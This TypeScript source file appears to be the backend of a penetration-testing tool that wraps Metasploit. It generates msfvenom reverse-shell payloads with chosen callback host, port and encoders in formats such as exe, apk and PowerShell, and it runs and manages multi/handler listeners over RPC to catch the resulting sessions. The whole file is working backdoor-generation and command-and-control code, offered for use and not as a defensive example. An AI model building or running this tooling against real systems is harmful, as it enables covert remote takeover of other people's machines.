import { getRpcToken, rpcCall } from "./msf-rpc";
import { execSync } from "child_process";
import * as fs from "fs";
import * as path from "path";
import * as crypto from "node:crypto";

const PAYLOADS_DIR = path.join(process.cwd(), "payloads");

export type PayloadOptions = {
  payload: string;
  lhost: string;
  lport: number;
  format: string;
  platform?: string;
  arch?: string;
  encoder?: string;
  iterations?: number;
  name?: string;
  extraOptions?: string;
};

export type GeneratedPayload = {
  id: string;
  filename: string;
  payload: string;
  lhost: string;
  lport: number;
  format: string;
  size: number;
  createdAt: string;
  downloaded: boolean;
};

export type Listener = {
  id: string;
  payload: string;
  lhost: string;
  lport: number;
  status: "running" | "stopped";
  sessionCount: number;
  createdAt: string;
  jobId?: string;
};

export type BackdoorStatus = {
  msfvenomAvailable: boolean;
  dockerAvailable: boolean;
  demoMode: false;
  error?: string;
};

// ─── Docker detection ──────────────────────────────────────────

function isDockerAvailable(): boolean {
  try {
    execSync("docker info", { stdio: "ignore", timeout: 5000 });
    return true;
  } catch {
    return false;
  }
}

function isMsfvenomInDocker(): boolean {
  try {
    execSync("docker exec metasploit-rpc msfvenom --help", {
      stdio: "ignore",
      timeout: 5000,
    });
    return true;
  } catch {
    return false;
  }
}

export function getBackdoorStatus(): BackdoorStatus {
  try {
    const dockerOk = isDockerAvailable();
    return {
      msfvenomAvailable: dockerOk && isMsfvenomInDocker(),
      dockerAvailable: dockerOk,
      demoMode: false,
    };
  } catch (err) {
    return {
      msfvenomAvailable: false,
      dockerAvailable: false,
      demoMode: false,
      error: err instanceof Error ? err.message : "unknown",
    };
  }
}

// ─── Payload directory ─────────────────────────────────────────

function ensurePayloadsDir() {
  if (!fs.existsSync(PAYLOADS_DIR)) {
    fs.mkdirSync(PAYLOADS_DIR, { recursive: true });
  }
}

// ─── Generate payload via msfvenom in Docker ───────────────────

export async function generatePayload(opts: PayloadOptions): Promise<GeneratedPayload> {
  if (!isDockerAvailable() || !isMsfvenomInDocker()) {
    throw new Error(
      "msfvenom unavailable. Ensure Docker is running:\n  docker compose up -d",
    );
  }

  ensurePayloadsDir();

  const safeName = (opts.name ?? `payload-${Date.now()}`).replace(/[^a-zA-Z0-9._-]/g, "_");
  const extMap: Record<string, string> = {
    exe: "exe", elf: "bin", raw: "bin", python: "py",
    powershell: "ps1", c: "c", cs: "cs", ruby: "rb",
    vba: "vba", macho: "macho", war: "war", apk: "apk",
    jar: "jar", bash: "sh", php: "php", asp: "asp", aspx: "aspx",
  };
  const ext = extMap[opts.format] ?? "bin";
  const filename = `${safeName}.${ext}`;
  const containerOut = `/tmp/payloads/${filename}`;

  // Build msfvenom command
  const args: string[] = [
    "-p", opts.payload,
    `LHOST=${opts.lhost}`,
    `LPORT=${opts.lport}`,
    ...(opts.encoder ? ["-e", opts.encoder] : []),
    ...(opts.iterations && opts.iterations > 1 ? ["-i", String(opts.iterations)] : []),
    ...(opts.platform ? ["--platform", opts.platform] : []),
    ...(opts.arch ? ["-a", opts.arch] : []),
    ...(opts.extraOptions ? opts.extraOptions.split(/\s+/).filter(Boolean) : []),
    "-f", opts.format,
    "-o", containerOut,
  ];

  // Create output dir in container
  execSync(`docker exec metasploit-rpc mkdir -p /tmp/payloads`, { timeout: 5000 });

  const cmd = `docker exec metasploit-rpc msfvenom ${args.map((a) => `'${a.replace(/'/g, "'\\''")}'`).join(" ")}`;

  try {
    const output = execSync(cmd, { timeout: 120000, stdio: "pipe", encoding: "utf8" });
    // Copy payload from container to host
    const hostPath = path.join(PAYLOADS_DIR, filename);
    execSync(`docker cp 'metasploit-rpc:${containerOut}' '${hostPath}'`, { timeout: 15000 });
    // Clean up in container
    execSync(`docker exec metasploit-rpc rm -f '${containerOut}'`, { timeout: 5000 }).toString();

    const stats = fs.statSync(hostPath);
    const id = crypto.randomUUID();

    // Store metadata alongside payload
    const meta = {
      id, filename, payload: opts.payload, lhost: opts.lhost,
      lport: opts.lport, format: opts.format, size: stats.size,
      createdAt: new Date().toISOString(), downloaded: false,
      msfvenomOutput: output?.toString?.() ?? "",
    };
    fs.writeFileSync(path.join(PAYLOADS_DIR, `${filename}.meta.json`), JSON.stringify(meta, null, 2));

    return { id, filename, payload: opts.payload, lhost: opts.lhost, lport: opts.lport, format: opts.format, size: stats.size, createdAt: meta.createdAt, downloaded: false };
  } catch (err) {
    const msg = err instanceof Error ? err.message : "msfvenom failed";
    throw new Error(`Payload generation failed: ${msg}`);
  }
}

// ─── List generated payloads ──────────────────────────────────

export function listGeneratedPayloads(): GeneratedPayload[] {
  ensurePayloadsDir();
  const payloads: GeneratedPayload[] = [];
  try {
    const files = fs.readdirSync(PAYLOADS_DIR).filter((f) => !f.endsWith(".meta.json"));
    for (const file of files) {
      const filePath = path.join(PAYLOADS_DIR, file);
      const stats = fs.statSync(filePath);
      if (!stats.isFile()) continue;

      // Try to load metadata
      const metaPath = path.join(PAYLOADS_DIR, `${file}.meta.json`);
      if (fs.existsSync(metaPath)) {
        try {
          const meta = JSON.parse(fs.readFileSync(metaPath, "utf-8")) as GeneratedPayload;
          payloads.push(meta);
          continue;
        } catch { /* fall through to generic */ }
      }

      payloads.push({
        id: crypto.createHash("md5").update(file).digest("hex"),
        filename: file,
        payload: "—",
        lhost: "—",
        lport: 0,
        format: path.extname(file).slice(1) || "bin",
        size: stats.size,
        createdAt: stats.mtime.toISOString(),
        downloaded: false,
      });
    }
  } catch { /* ignore */ }
  return payloads.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
}

// ─── Listener management via MSF RPC ─────────────────────────

/**
 * Start a multi/handler listener via MSF RPC:
 * 1. module.execute("exploit", "multi/handler", options) → { job_id, uuid }
 */
export async function createListener(
  payload: string,
  lhost: string,
  lport: number,
): Promise<Listener> {
  const token = await getRpcToken();

  const result = await rpcCall<{ job_id?: number; uuid?: string }>(
    "module.execute",
    ["exploit", "multi/handler", {
      PAYLOAD: payload,
      LHOST: lhost,
      LPORT: lport,
      ExitOnSession: false,
    }],
    token,
  );

  const jobId = String(result.job_id ?? "0");

  return {
    id: crypto.randomUUID().slice(0, 8),
    payload,
    lhost,
    lport,
    status: "running",
    sessionCount: 0,
    createdAt: new Date().toISOString(),
    jobId,
  };
}

/**
 * List all running MSF jobs and cross-reference with session count.
 * job.list returns: { "0": "Exploit: multi/handler", "1": "...", ... }
 * job.info(id) returns: { name, start_time, datastore: { PAYLOAD, LHOST, LPORT, ... } }
 */
export async function listListeners(): Promise<Listener[]> {
  try {
    const token = await getRpcToken();

    const [jobs, sessionMap] = await Promise.all([
      rpcCall<Record<string, string>>("job.list", [], token),
      rpcCall<Record<string, unknown>>("session.list", [], token),
    ]);

    const totalSessions = Object.keys(sessionMap || {}).length;

    if (!jobs || Object.keys(jobs).length === 0) return [];

    const listeners: Listener[] = [];

    for (const [jobId, jobName] of Object.entries(jobs)) {
      // Only list handler jobs
      if (!String(jobName).toLowerCase().includes("handler") &&
          !String(jobName).toLowerCase().includes("multi")) continue;

      try {
        const info = await rpcCall<{
          name?: string;
          start_time?: number;
          datastore?: Record<string, unknown>;
        }>("job.info", [Number(jobId)], token);

        const ds = info?.datastore ?? {};
        listeners.push({
          id: jobId,
          payload: String(ds.PAYLOAD ?? ds.payload ?? "unknown"),
          lhost:   String(ds.LHOST ?? ds.lhost ?? "0.0.0.0"),
          lport:   Number(ds.LPORT ?? ds.lport ?? 4444),
          status:  "running",
          sessionCount: totalSessions,
          createdAt: info?.start_time
            ? new Date(info.start_time * 1000).toISOString()
            : new Date().toISOString(),
          jobId,
        });
      } catch {
        // job.info failed for this job — include generic entry
        listeners.push({
          id: jobId,
          payload: String(jobName).replace("Exploit: ", ""),
          lhost: "—",
          lport: 0,
          status: "running",
          sessionCount: totalSessions,
          createdAt: new Date().toISOString(),
          jobId,
        });
      }
    }

    return listeners;
  } catch {
    return [];
  }
}

export async function stopListener(jobId: string): Promise<void> {
  const token = await getRpcToken();
  await rpcCall("job.stop", [Number(jobId)], token);
}

export function deletePayload(filename: string): boolean {
  const safeName = path.basename(filename).replace(/[^a-zA-Z0-9._-]/g, "_");
  const filePath = path.join(PAYLOADS_DIR, safeName);
  const metaPath = path.join(PAYLOADS_DIR, `${safeName}.meta.json`);
  let deleted = false;
  if (fs.existsSync(filePath)) { fs.unlinkSync(filePath); deleted = true; }
  if (fs.existsSync(metaPath)) { fs.unlinkSync(metaPath); }
  return deleted;
}
